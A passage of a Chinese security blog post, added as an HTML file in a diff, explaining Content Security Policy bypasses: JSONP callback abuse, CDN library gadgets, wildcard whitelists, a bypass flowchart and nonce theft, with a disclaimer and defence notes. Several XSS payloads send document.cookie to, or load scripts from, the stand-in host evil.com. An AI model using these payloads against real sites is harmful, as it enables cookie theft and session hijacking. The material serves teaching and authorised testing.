@@ -1,0 +1,527 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 8.1.2">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"congliang.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.27.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="CSP（内容安全策略）是防御 XSS 的最后一道防线，但它并非无懈可击。从 JSONP 劫持、CDN 白名单滥用、nonce 窃取、base-uri 注入到 strict-dynamic 绕过与 CSPT2CSRF——本文逐条拆解 CSP 绕过策略，附带可复现的代码示例与决策流程图。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CSP绕过策略">
+<meta property="og:url" content="https://congliang.github.io/XSS-csp-bypass/">
+<meta property="og:site_name" content="渗透测试实战记录">
+<meta property="og:description" content="CSP（内容安全策略）是防御 XSS 的最后一道防线，但它并非无懈可击。从 JSONP 劫持、CDN 白名单滥用、nonce 窃取、base-uri 注入到 strict-dynamic 绕过与 CSPT2CSRF——本文逐条拆解 CSP 绕过策略，附带可复现的代码示例与决策流程图。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-04-01T00:00:00.000Z">
+<meta property="article:modified_time" content="2026-06-04T15:35:18.352Z">
+<meta property="article:author" content="YunShang">
+<meta property="article:tag" content="Web安全">
+<meta property="article:tag" content="渗透测试">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://congliang.github.io/XSS-csp-bypass/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://congliang.github.io/XSS-csp-bypass/","path":"XSS-csp-bypass/","title":"CSP绕过策略"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>CSP绕过策略 | 渗透测试实战记录</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  
+
+  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"default","dark":"dark"},"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mermaid/11.10.1/mermaid.min.js","integrity":"sha256-BmQmdWDS8X2OTbrwELWK366LV6escyWhHHe0XCTU/Hk="}}</script>
+  <script src="/js/third-party/tags/mermaid.js" defer></script>
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">渗透测试实战记录</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">边学边记</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E3%80%81CSP-%E7%AD%96%E7%95%A5%E7%BB%93%E6%9E%84%E9%80%9F%E8%A7%88"><span class="nav-number">2.</span> <span class="nav-text">一、CSP 策略结构速览</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E3%80%81script-src-%E7%99%BD%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87"><span class="nav-number">3.</span> <span class="nav-text">二、script-src 白名单绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-JSONP-%E5%8A%AB%E6%8C%81"><span class="nav-number">3.1.</span> <span class="nav-text">2.1 JSONP 劫持</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-CDN-Gadget-%E5%88%A9%E7%94%A8"><span class="nav-number">3.2.</span> <span class="nav-text">2.2 CDN Gadget 利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-3-%E5%9F%9F%E5%90%8D%E7%99%BD%E5%90%8D%E5%8D%95%E7%9A%84%E9%95%BF%E5%B0%BE%E9%A3%8E%E9%99%A9"><span class="nav-number">3.3.</span> <span class="nav-text">2.3 域名白名单的长尾风险</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-4-%E7%BB%95%E8%BF%87%E5%86%B3%E7%AD%96%E6%B5%81%E7%A8%8B%E5%9B%BE"><span class="nav-number">3.4.</span> <span class="nav-text">2.4 绕过决策流程图</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%E3%80%81Nonce-%E7%AA%83%E5%8F%96"><span class="nav-number">4.</span> <span class="nav-text">三、Nonce 窃取</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#3-1-%E7%AA%83%E5%8F%96%E6%9D%A1%E4%BB%B6%E4%B8%8E%E6%89%8B%E6%B3%95"><span class="nav-number">4.1.</span> <span class="nav-text">3.1 窃取条件与手法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-2-%E9%98%B2%E5%BE%A1"><span class="nav-number">4.2.</span> <span class="nav-text">3.2 防御</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9B%E3%80%81Base-uri-%E6%B3%A8%E5%85%A5"><span class="nav-number">5.</span> <span class="nav-text">四、Base-uri 注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#4-1-%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86"><span class="nav-number">5.1.</span> <span class="nav-text">4.1 攻击原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-2-%E5%AE%8C%E6%95%B4%E6%94%BB%E5%87%BB%E9%93%BE"><span class="nav-number">5.2.</span> <span class="nav-text">4.2 完整攻击链</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-3-%E9%98%B2%E5%BE%A1"><span class="nav-number">5.3.</span> <span class="nav-text">4.3 防御</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%94%E3%80%81strict-dynamic-%E7%BB%95%E8%BF%87"><span class="nav-number">6.</span> <span class="nav-text">五、strict-dynamic 绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#5-1-%E4%BF%A1%E4%BB%BB%E4%BC%A0%E9%80%92%E9%93%BE"><span class="nav-number">6.1.</span> <span class="nav-text">5.1 信任传递链</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-2-%E6%94%BB%E5%87%BB%E9%9D%A2"><span class="nav-number">6.2.</span> <span class="nav-text">5.2 攻击面</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-3-%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF%E9%85%8D%E7%BD%AE"><span class="nav-number">6.3.</span> <span class="nav-text">5.3 常见错误配置</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%AD%E3%80%81CSPT2CSRF-%E6%8A%80%E6%9C%AF"><span class="nav-number">7.</span> <span class="nav-text">六、CSPT2CSRF 技术</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#6-1-CSPT-%E5%8E%9F%E7%90%86"><span class="nav-number">7.1.</span> <span class="nav-text">6.1 CSPT 原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-2-%E5%8D%87%E7%BA%A7%E4%B8%BA-CSRF"><span class="nav-number">7.2.</span> <span class="nav-text">6.2 升级为 CSRF</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-3-%E9%98%B2%E5%BE%A1"><span class="nav-number">7.3.</span> <span class="nav-text">6.3 防御</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%83%E3%80%81CSP-Evaluator-%E8%87%AA%E5%8A%A8%E5%8C%96%E6%A3%80%E6%B5%8B"><span class="nav-number">8.</span> <span class="nav-text">七、CSP Evaluator 自动化检测</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%AB%E3%80%81%E5%B8%B8%E8%A7%81%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF%E4%B8%8E%E9%81%BF%E5%9D%91%E6%8C%87%E5%8D%97"><span class="nav-number">9.</span> <span class="nav-text">八、常见配置错误与避坑指南</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#8-1-default-src-%E8%BF%87%E5%AE%BD"><span class="nav-number">9.1.</span> <span class="nav-text">8.1 default-src 过宽</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#8-2-report-uri-%E4%B8%8D%E6%98%AF%E9%98%B2%E5%BE%A1"><span class="nav-number">9.2.</span> <span class="nav-text">8.2 report-uri 不是防御</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#8-3-%E5%BF%98%E8%AE%B0%E9%99%90%E5%88%B6-object-src"><span class="nav-number">9.3.</span> <span class="nav-text">8.3 忘记限制 object-src</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#8-4-script-src-elem-%E4%B8%8E-script-src-attr-%E7%9A%84%E8%A6%86%E7%9B%96%E9%99%B7%E9%98%B1"><span class="nav-number">9.4.</span> <span class="nav-text">8.4 script-src-elem 与 script-src-attr 的覆盖陷阱</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#8-5-%E5%90%8C%E6%97%B6%E4%BD%BF%E7%94%A8-CSP-%E5%92%8C-X-XSS-Protection"><span class="nav-number">9.5.</span> <span class="nav-text">8.5 同时使用 CSP 和 X-XSS-Protection</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B9%9D%E3%80%81%E6%80%BB%E7%BB%93"><span class="nav-number">10.</span> <span class="nav-text">九、总结</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">YunShang</p>
+  <div class="site-description" itemprop="description">渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">127</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/congliang" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;congliang" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:yunshang0069@126.com" title="E-Mail → mailto:yunshang0069@126.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://congliang.github.io/XSS-csp-bypass/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="YunShang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="渗透测试实战记录">
+      <meta itemprop="description" content="渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="CSP绕过策略 | 渗透测试实战记录">
+      <meta itemprop="description" content="CSP（内容安全策略）是防御 XSS 的最后一道防线，但它并非无懈可击。从 JSONP 劫持、CDN 白名单滥用、nonce 窃取、base-uri 注入到 strict-dynamic 绕过与 CSPT2CSRF——本文逐条拆解 CSP 绕过策略，附带可复现的代码示例与决策流程图。">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          CSP绕过策略
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2025-04-01 08:00:00" itemprop="dateCreated datePublished" datetime="2025-04-01T08:00:00+08:00">2025-04-01</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-06-04 23:35:18" itemprop="dateModified" datetime="2026-06-04T23:35:18+08:00">2026-06-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/pentest/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+            <div class="post-description">CSP（内容安全策略）是防御 XSS 的最后一道防线，但它并非无懈可击。从 JSONP 劫持、CDN 白名单滥用、nonce 窃取、base-uri 注入到 strict-dynamic 绕过与 CSPT2CSRF——本文逐条拆解 CSP 绕过策略，附带可复现的代码示例与决策流程图。</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>CSP（Content Security Policy）是浏览器内置的安全机制，通过 HTTP 响应头或 <code>&lt;meta&gt;</code> 标签告诉浏览器”哪些资源可以加载、哪些脚本可以执行”。正确配置的 CSP 能有效防御 XSS——但”正确配置”是关键词。现实中因为业务需求（第三方脚本、CDN、埋点）而放宽限制，攻击者正是利用这些”缝隙”绕过 CSP。</p>
+<blockquote>
+<p><strong>免责声明：</strong> 本文所有技术仅供安全研究、授权测试与防御体系建设使用，禁止用于任何非法用途。因不当使用导致的后果由行为人自行承担。</p>
+</blockquote>
+<hr>
+<h2 id="一、CSP-策略结构速览"><a href="#一、CSP-策略结构速览" class="headerlink" title="一、CSP 策略结构速览"></a>一、CSP 策略结构速览</h2><p>CSP 通过 <strong>指令（directive）</strong> 和 <strong>源（source）</strong> 定义资源白名单：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &#x27;self&#x27;; script-src &#x27;self&#x27; cdn.example.com;</span><br><span class="line">style-src &#x27;self&#x27; &#x27;unsafe-inline&#x27;; img-src *; connect-src &#x27;self&#x27;;</span><br><span class="line">frame-src &#x27;none&#x27;; base-uri &#x27;self&#x27;; form-action &#x27;self&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>核心指令一览：</p>
+<table>
+<thead>
+<tr>
+<th>指令</th>
+<th>作用</th>
+<th>常见风险</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>default-src</code></td>
+<td>所有资源类型兜底策略</td>
+<td>设为 <code>*</code> 等于没有 CSP</td>
+</tr>
+<tr>
+<td><code>script-src</code></td>
+<td>控制可执行 JS 来源</td>
+<td><strong>攻击面最大</strong>，本文重点</td>
+</tr>
+<tr>
+<td><code>base-uri</code></td>
+<td>控制 <code>&lt;base&gt;</code> 标签</td>
+<td>未设置可导致 base-uri 注入</td>
+</tr>
+<tr>
+<td><code>object-src</code></td>
+<td>控制 <code>&lt;object&gt;</code>&#x2F;<code>&lt;embed&gt;</code></td>
+<td>应始终设为 <code>&#39;none&#39;</code></td>
+</tr>
+<tr>
+<td><code>form-action</code></td>
+<td>控制表单提交目标</td>
+<td>未限制可被用于钓鱼</td>
+</tr>
+<tr>
+<td><code>frame-src</code></td>
+<td>控制 iframe 嵌套来源</td>
+<td>宽松可致点击劫持</td>
+</tr>
+<tr>
+<td><code>connect-src</code></td>
+<td>控制 XHR&#x2F;WebSocket&#x2F;fetch</td>
+<td>限制 C2 通道</td>
+</tr>
+</tbody></table>
+<p>CSP 可通过 HTTP 响应头（推荐）或 <code>&lt;meta&gt;</code> 标签（功能受限）部署。</p>
+<hr>
+<h2 id="二、script-src-白名单绕过"><a href="#二、script-src-白名单绕过" class="headerlink" title="二、script-src 白名单绕过"></a>二、script-src 白名单绕过</h2><p><code>script-src</code> 是最难配置完美的指令。一旦白名单中存在可利用的域名，CSP 就可能被击穿。</p>
+<h3 id="2-1-JSONP-劫持"><a href="#2-1-JSONP-劫持" class="headerlink" title="2.1 JSONP 劫持"></a>2.1 JSONP 劫持</h3><p>JSONP 端点天然允许任意回调函数名，如果其域名在 <code>script-src</code> 白名单中，攻击者可直接注入代码：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- CSP 白名单包含 cdn.example.com，且其上存在 JSONP 端点 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.example.com/jsonp/userinfo?callback=alert(document.domain)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 利用 JSONP 外带数据 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.example.com/api?callback=fetch(&#x27;https://evil.com/?&#x27;+document.cookie)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>防御：</strong> 白名单不应包含 JSONP 端点域名；若必须列入，确保对 callback 参数做白名单校验。</p>
+<h3 id="2-2-CDN-Gadget-利用"><a href="#2-2-CDN-Gadget-利用" class="headerlink" title="2.2 CDN Gadget 利用"></a>2.2 CDN Gadget 利用</h3><p>公共 CDN（cdnjs、jsDelivr、unpkg）上托管着海量第三方包，某些库自身具备代码执行能力（”Gadget”），可被攻击者利用：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- cdnjs.cloudflare.com 在白名单中，Angular 1.6.1 沙箱逃逸 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.1/angular.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">ng-app</span> <span class="attr">ng-csp</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">ng-click</span>=<span class="string">&quot;$event.view.alert(1)&quot;</span>&gt;</span>Click me<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- RequireJS data-main 加载任意脚本 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/requirejs@2.3.6/require.js&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">data-main</span>=<span class="string">&quot;https://evil.com/payload.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="2-3-域名白名单的长尾风险"><a href="#2-3-域名白名单的长尾风险" class="headerlink" title="2.3 域名白名单的长尾风险"></a>2.3 域名白名单的长尾风险</h3><p><code>*.example.com</code>（过期子域名接管）、<code>*.cloudfront.net</code> &#x2F; <code>*.s3.amazonaws.com</code>（公开 bucket 上传）、<code>*.googleapis.com</code>（JSONP 端点）。任何一个被攻破都可能导致 CSP 形同虚设。</p>
+<h3 id="2-4-绕过决策流程图"><a href="#2-4-绕过决策流程图" class="headerlink" title="2.4 绕过决策流程图"></a>2.4 绕过决策流程图</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">注入点被发现</span><br><span class="line">    │</span><br><span class="line">    ▼</span><br><span class="line">检查 script-src 白名单</span><br><span class="line">    │</span><br><span class="line">    ├── 包含 JSONP 端点？ ──→ callback=payload → 绕过</span><br><span class="line">    ├── 包含 CDN (cdnjs/unpkg)？ ──→ 寻找代码执行 Gadget</span><br><span class="line">    ├── 包含通配符域名？ ──→ 检查子域名接管</span><br><span class="line">    ├── 包含云存储域名？ ──→ 上传恶意 JS</span><br><span class="line">    ├── 包含 &#x27;unsafe-inline&#x27;？ ──→ 直接注入 &lt;script&gt; / onerror</span><br><span class="line">    └── 以上皆否 ──→ 尝试 nonce 窃取 / base-uri 注入</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="三、Nonce-窃取"><a href="#三、Nonce-窃取" class="headerlink" title="三、Nonce 窃取"></a>三、Nonce 窃取</h2><p>CSP nonce 机制：服务端每次响应生成随机 nonce，浏览器只执行 nonce 匹配的脚本。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 响应头 --&gt;</span></span><br><span class="line">Content-Security-Policy: script-src &#x27;nonce-r4nd0m123&#x27;</span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 合法脚本 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">nonce</span>=<span class="string">&quot;r4nd0m123&quot;</span>&gt;</span><span class="language-javascript"><span class="comment">/* 合法业务代码 */</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 攻击者注入的 inline script — 没有 nonce，不执行 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="3-1-窃取条件与手法"><a href="#3-1-窃取条件与手法" class="headerlink" title="3.1 窃取条件与手法"></a>3.1 窃取条件与手法</h3><p>Nonce 被窃取的前提：页面存在 DOM XSS、nonce 可预测（时间戳&#x2F;递增数字）或跨页面复用。</p>
+<p>当页面通过 <code>innerHTML</code> 将用户输入插入 DOM 时，虽然 <code>&lt;script&gt;</code> 标签不会执行，但事件处理器仍可读取 nonce：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 攻击者 payload —— 从 DOM 中读取 nonce 并用于创建被信任的脚本 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">&quot;</span></span></span><br><span class="line"><span class="string"><span class="tag">  var s = document.createElement(&#x27;script&#x27;);</span></span></span><br><span class="line"><span class="string"><span class="tag">  s.nonce = document.querySelector(&#x27;script[nonce]&#x27;).nonce;</span></span></span><br><span class="line"><span class="string"><span class="tag">  s.src = &#x27;https://evil.com/steal.js&#x27;;</span></span></span><br><span class="line"><span class="string"><span class="tag">  document.head.appendChild(s);</span></span></span><br><span class="line"><span class="string"><span class="tag">&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>关键点：</strong> <code>&lt;script nonce=&quot;...&quot;&gt;</code> 标签的 nonce 属性是 DOM 的一部分，任何 JS 都可读取——nonce 对外不可见但对内可见。</p>
+<h3 id="3-2-防御"><a href="#3-2-防御" class="headerlink" title="3.2 防御"></a>3.2 防御</h3><p>使用 <code>strict-dynamic</code> 减少 nonce 依赖；杜绝 DOM XSS；Nonce 每次请求用密码学安全随机数生成。</p>
+<hr>
+<h2 id="四、Base-uri-注入"><a href="#四、Base-uri-注入" class="headerlink" title="四、Base-uri 注入"></a>四、Base-uri 注入</h2><p><code>base-uri</code> 是指制 <code>&lt;base&gt;</code> 标签的指令，常被忽略但极其危险。</p>
+<h3 id="4-1-攻击原理"><a href="#4-1-攻击原理" class="headerlink" title="4.1 攻击原理"></a>4.1 攻击原理</h3><p>当 CSP 未设置 <code>base-uri</code>（或设为 <code>*</code>），攻击者可注入 <code>&lt;base&gt;</code> 标签改变相对路径解析基准：</p>
